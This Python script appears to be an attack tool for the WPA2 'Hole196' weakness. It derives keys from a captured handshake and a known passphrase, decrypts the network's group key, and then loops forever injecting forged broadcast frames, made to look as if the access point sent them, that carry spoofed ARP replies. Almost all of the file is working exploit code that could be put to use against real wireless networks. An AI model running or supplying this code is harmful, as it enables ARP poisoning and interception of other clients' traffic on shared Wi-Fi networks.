
import time
import binascii
from scapy.layers.dot11 import RadioTap,  Dot11, Dot11CCMP, LLC
from scapy.layers.l2 import SNAP, ARP
from scapy.layers.inet import IP, ICMP
from scapy.all import *
from cls_collPcapFile import collPcap
from cls_ccmp import ccmp
from def_getKey import getPTK, getPMK, getGTK

def pn2bytes(pn:int)->bytes:
	pnBytes = [0] * 6
	for i in range(6):
		pnBytes[i] = pn & 0xFF
		pn >>= 8
	return pnBytes

def bytes2mac(bytesMac:bytes)->str:
    byte2str = binascii.hexlify(bytesMac).decode('ascii').upper()
    mac = ''
    for i, char in enumerate(byte2str):
        mac += char
        if (i + 1) % 2 == 0:
            mac += ":"
    return mac[:-1]

def atkHole196(pcapPath:str, pwd:str):
    conf.verb = 0
    collCls = collPcap()
    collCls.read(pcapPath, hashcatFlag=False)

    pmk = getPMK(collCls.ESSID, pwd)
    ptk = getPTK(pmk, collCls.MAC_AP, collCls.MAC_CLIENT, collCls.NONCE_AP, collCls.NONCE_CLIENT)
    kek = ptk[16:32]
    print('KEK : '+binascii.hexlify(kek).decode('ascii'))
    gtk, keyId = getGTK(kek, collCls.GTK_ENCDATA)
    if gtk == None:
        return False
    # PMK -> PTK -> KEK -> GTK (Broadcast/Multicast Key)
    
    srcAddr = '12:34:56:78:90:12' # Pseudo MAC (Attacker MAC)
    dstAddr = 'FF:FF:FF:FF:FF:FF' # Dst MAC
    bssAddr = bytes2mac(collCls.MAC_AP) # BSSID
    pn = 500
    while(True):
        plainFrame = LLC()/SNAP()/\
        ARP(hwsrc='11:22:33:44:55:66', hwdst=srcAddr, psrc='192.168.0.1', pdst='192.168.0.255' ,op=2)
        # ARP Reply (Spoofing)

        # plainFrame = LLC()/SNAP()/\
        # ARP(hwsrc='50:77:05:96:30:0A', hwdst='00:00:00:00:00:00', psrc='192.168.0.128', pdst='192.168.0.175' ,op=1)
        # # ARP Request

        encFrame = ccmp.encrypt(gtk, plainFrame, dstAddr, bssAddr, srcAddr, pn)
        encFrame = RadioTap() /\
            Dot11(type=2, subtype=0, addr1=dstAddr, addr2=bssAddr, addr3=srcAddr)/\
            Dot11CCMP() /\
            Raw(encFrame) # A1, A2, A3가 from-DS에 맞게 세팅됨.
        
        encFrame.FCfield = "from-DS"
        # Set fromDS Flag (ATK → AP → VIC)
        encFrame.FCfield |= Dot11(FCfield="protected").FCfield
        # Protected Flag
        encFrame.PN0, encFrame.PN1, encFrame.PN2, encFrame.PN3, encFrame.PN4, encFrame.PN5 = pn2bytes(pn)
        # Packet Number
        encFrame.key_id = keyId 
        # GTK의 KeyID는 1과 2 사이에서 움직임
        # (https://csrc.nist.rip/archive/wireless/S10_802.11i%20Overview-jw1.pdf, p62)
        encFrame.ext_iv = 1
        # CCMP의 EXT_IV는 항상 1로 고정
        
        sendp(encFrame)
        print('Hole196 Test Frame Sent. (PN='+str(pn)+', KeyID='+str(keyId)+', AP='+bssAddr+' -> STN='+dstAddr+')')
        
        pn +=1000
        time.sleep(0.1)
